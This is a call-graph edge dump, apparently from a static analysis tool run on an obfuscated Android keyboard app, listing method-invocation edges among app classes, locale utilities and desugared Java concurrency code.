INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hcb: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null languageTag") in <hny: void <init>(ivw,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid country code: %s", $r0, $r6) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<ing: void <init>(java.lang.String,iec)>($r2, $r3) in <iej: void g(java.lang.String,iec)> ==> <ing: void <init>(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.String getName()>() in <miv: void <clinit>()> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(5) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<miv: void <init>(java.lang.Object)>(null) in <miv: void <clinit>()> ==> <miv: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <ivv: void <init>(byte[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, 1, $i1) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <idq: idq a(java.lang.String,mag)>("PlaystoreStickerImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <lwg: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke $r3.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_THUMBNAIL", 3, 3) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<androidx.core.content.FileProvider: void <init>()>() in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void <init>()>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int compareTo(java.lang.Enum)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>($i5) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>("array index scale not a power of two") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $l0 = staticinvoke <java.lang.System: long currentTimeMillis()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long currentTimeMillis()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[])>($r0) in <iwt: java.lang.String c(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: $i0 = staticinvoke <kwe: int O(long,long)>($l1, $l2) in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <kwe: int O(long,long)>
VIRTUAL edge: $r9 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<java.lang.String: int length()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <java.util.LinkedHashMap: java.lang.Object get(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r2, $i1) in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int length()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r4 = staticinvoke <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>("cja-XA", "doi-XA", "doi-XD", "doi-XU", "doi-Deva", "doi-Latn", $r0) in <ivw: void <clinit>()> ==> <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: int hashCode()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r2, $i1, $r3, 0, $i0) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: $i3 = specialinvoke r0.<qj: int i(java.lang.Object,int)>($r2, $i2) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <qj: int i(java.lang.Object,int)>
STATIC edge: $r14 = staticinvoke <lkq: lkl e()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkq: lkl e()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(16) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<lnd: void <init>(java.lang.Object[])>($r1) in <lnd: void <clinit>()> ==> <lnd: void <init>(java.lang.Object[])>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <hnc: java.lang.String k(java.lang.String,java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r21.<mag: void <init>(java.lang.String,int,int)>("CURATED_IMAGE", 21, 21) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(8) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
CLINIT edge: staticinvoke <dwx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dwx: void <clinit>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "transferIndex") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("invalid tag type: ") in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r7 = staticinvoke <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>("zh-CN", "com.google.android.inputmethod.pinyin", "zh-TW", "com.google.android.apps.inputmethod.zhuyin", "zh-HK", "com.google.android.apps.inputmethod.cantonese", "ko", "com.google.android.inputmethod.korean") in <hnt: void <clinit>()> ==> <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>($r1) in <j$.util.concurrent.e: void <init>(j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.b: void <init>(j$.util.concurrent.ConcurrentHashMap)>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentShift", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
CLINIT edge: staticinvoke <hnt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hnt: void <clinit>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>($r1, $i0, 0, $i1) in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: void <init>(j$.util.concurrent.l[],int,int,int)>
SPECIAL edge: specialinvoke $r19.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_CREATE", 19, 19) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <lsm: int b()>
SPECIAL edge: specialinvoke $r0.<lwg: void <init>()>() in <lwh: void <clinit>()> ==> <lwg: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r2.<gbk: void <init>(int)>(18) in <ivw: void <clinit>()> ==> <gbk: void <init>(int)>
INTERFACE edge: $r6 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<java.lang.StringBuilder: void <init>()>() in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r3 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r3, 0) in <lvr: void <init>(java.util.List)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r8.<lup: void <init>(lwc,java.lang.String)>($r9, $r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lup: void <init>(lwc,java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>() in <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <init>()>
CLINIT edge: staticinvoke <luk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <luk: void <clinit>()>
SPECIAL edge: specialinvoke $r1.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <nzh: java.lang.String c()> ==> <java.lang.String: void <init>(char[],int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <miv: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <miv: void <clinit>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void k(java.lang.Object[],java.lang.Object[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.IndexOutOfBoundsException: void <init>()> ==> <java.lang.RuntimeException: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
VIRTUAL edge: $r9 = virtualinvoke r0.<lsn: lwc a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsd: lwc a()>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsc: java.lang.String e()>() in <lsh: lse h(java.util.logging.Level)> ==> <lsc: java.lang.String e()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lkx: boolean containsKey(java.lang.Object)> ==> <lqk: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>() in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.Class: java.lang.reflect.Field[] getDeclaredFields()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r4, $i2, $r8, $i3, $i5) in <lvr: void <init>(lvr,lvr)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r29.<mag: void <init>(java.lang.String,int,int)>("TENOR_STATIC_IMAGE", 29, 29) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ivv: ivw b(java.lang.String)>($r0) in <ivw: ivw f(java.lang.String)> ==> <ivv: ivw b(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.util.NoSuchElementException: void <init>()>() in <liz: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r3.<java.lang.IndexOutOfBoundsException: void <init>()>() in <lsm: java.lang.Object e(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(6) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Cannot find field:") in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r1.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <ltr: java.lang.Object d(lsz)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorTrendingMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(8) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(8) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>($r1, $r3) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: void <init>(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(0) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: $r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(9) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke $r6.<java.lang.Enum: int ordinal()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.Enum: int ordinal()>
INTERFACE edge: $r9 = interfaceinvoke $r7.<java.util.Map$Entry: java.lang.Object getValue()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: staticinvoke <java.util.Collections: void sort(java.util.List)>($r3) in <ivv: ivw a()> ==> <java.util.Collections: void sort(java.util.List)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>($z0, "injected class name is empty") in <lsh: lsh j(java.lang.String)> ==> <lvm: void h(boolean,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<liz: java.lang.Object a(int)>($i0) in <liz: java.lang.Object next()> ==> <liw: java.lang.Object a(int)>
SPECIAL edge: $i0 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
SPECIAL edge: specialinvoke r0.<lsd: void <init>(java.util.logging.Level)>($r2) in <lsf: void <init>(lsh,java.util.logging.Level)> ==> <lsd: void <init>(java.util.logging.Level)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lts: void <init>()>() in <ltr: void <init>()> ==> <lts: void <init>()>
STATIC edge: $r6 = staticinvoke <ivw: ivw f(java.lang.String)>("zz") in <hnt: void <clinit>()> ==> <ivw: ivw f(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r10.<java.lang.Throwable: java.lang.Throwable getCause()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.Throwable: java.lang.Throwable getCause()>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsq: void <init>()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
SPECIAL edge: specialinvoke $r0.<lqk: void <init>()>() in <lqk: void <clinit>()> ==> <lqk: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)> ==> <androidx.lifecycle.ProcessLifecycleOwnerInitializer: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
VIRTUAL edge: $r1 = virtualinvoke $r0.<java.lang.String: char[] toCharArray()>() in <iwt: char[] s(java.lang.String,char,char,int)> ==> <java.lang.String: char[] toCharArray()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke r0.<lsn: lsw i(lsq)>($r4) in <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsn: lsw i(lsq)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(3) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <hcb: void <init>()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: void setLength(int)>(0) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: void setLength(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivw: void <init>(ivv,java.lang.String)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: $i0 = specialinvoke r0.<java.util.AbstractMap: int hashCode()>() in <lvr: int hashCode()> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r1.<java.util.concurrent.atomic.AtomicLong: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void e(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void e(java.lang.String)>
